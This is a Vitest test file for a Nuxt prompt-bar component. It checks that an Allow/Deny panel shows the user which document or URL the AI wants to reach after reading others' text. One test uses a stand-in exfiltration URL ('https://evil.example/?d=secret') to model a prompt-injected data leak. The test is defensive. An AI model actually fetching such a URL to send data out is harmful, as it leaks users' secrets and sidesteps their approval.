// @vitest-environment nuxt
import { describe, it, expect, vi } from 'vitest'
import { ref, computed } from 'vue'
import { mountSuspended, registerEndpoint, mockNuxtImport } from '@nuxt/test-utils/runtime'
import { AIPromptBar } from '#components'
import type { AiAvailability } from '~~/shared/ai/providers'
import { useQueryCache } from '@pinia/colada'
import { aiKeys } from '~/queries/ai'
import type { AiConfirmationRequest } from '~/composables/ai/useAI'

// The inline "Allow / Deny" confirm in the prompt bar (A1). Shown when
// the AI, after reading other people's text, wants to reach the user's
// other documents, knowledge or the web; the answer goes back through
// `answerConfirmation`.

mockNuxtImport('useUserSession', () => () => ({
  loggedIn: ref(true),
  user: ref({ id: 1, name: 'Maya' }),
  session: ref({}),
  fetch: vi.fn(),
  clear: vi.fn()
}))
mockNuxtImport('useToast', () => () => ({ add: vi.fn() }))

registerEndpoint('/api/ai/credits', () => ({ pointsRemaining: 500, pointsTotal: 1000, plan: 'free', periodEnd: new Date().toISOString(), attribution: 'user' }))
registerEndpoint('/api/user/billing', () => ({ plan: 'free' }))

type AiProp = InstanceType<typeof AIPromptBar>['$props']['ai']

function aiProps(confirmation: AiConfirmationRequest | null, answer = vi.fn(async (_allow: boolean) => {})): AiProp {
  return {
    mySession: computed(() => null),
    mySessionId: computed(() => null),
    otherSessions: computed(() => []),
    submitting: ref(false),
    lastError: ref<string | null>(null),
    budgetExhausted: ref(false),
    lastResponse: ref<AiProp['lastResponse']['value']>(null),
    pendingConfirmation: computed(() => confirmation),
    answeringConfirmation: ref(false),
    answerConfirmation: answer,
    prompt: async () => true,
    abort: async () => {},
    clearLastError: () => {}
  }
}

function available(): void {
  const s = { available: true, source: 'instance' as const, platformBilled: true }
  useQueryCache().setQueryData<AiAvailability>(aiKeys.availabilityFor(null), {
    chat: { ...s, supportsVision: true },
    image: s,
    transcription: { ...s, liveDictation: true },
    webTools: { search: true, fetch: true }
  })
}

describe('AIPromptBar: confirmation request', () => {
  it('no pending request → no panel', async () => {
    available()
    const wrapper = await mountSuspended(AIPromptBar, { props: { ai: aiProps(null) } })
    expect(wrapper.find('[data-testid="ai-confirm-panel"]').exists()).toBe(false)
  })

  it('shows what markoto wants to read, and Deny / Allow answer it', async () => {
    available()
    const answer = vi.fn(async (_allow: boolean) => {})
    const request = { id: 'c1', tool: 'view_other_document', target: 'Q3 plan', expiresAt: Date.now() + 60_000 }
    const wrapper = await mountSuspended(AIPromptBar, { props: { ai: aiProps(request, answer) } })
    const panel = wrapper.find('[data-testid="ai-confirm-panel"]')
    expect(panel.exists()).toBe(true)
    expect(panel.attributes('role')).toBe('alertdialog')
    expect(wrapper.find('[data-testid="ai-confirm-question"]').text()).toContain('Q3 plan')

    await wrapper.find('[data-testid="ai-confirm-deny"]').trigger('click')
    await wrapper.find('[data-testid="ai-confirm-allow"]').trigger('click')
    expect(answer.mock.calls).toEqual([[false], [true]])
  })

  it('shows the exact URL for a fetch the user did not type', async () => {
    available()
    const request = { id: 'c2', tool: 'fetch_url', target: 'https://evil.example/?d=secret', expiresAt: Date.now() + 60_000 }
    const wrapper = await mountSuspended(AIPromptBar, { props: { ai: aiProps(request) } })
    expect(wrapper.find('[data-testid="ai-confirm-question"]').text()).toContain('https://evil.example/?d=secret')
  })
})
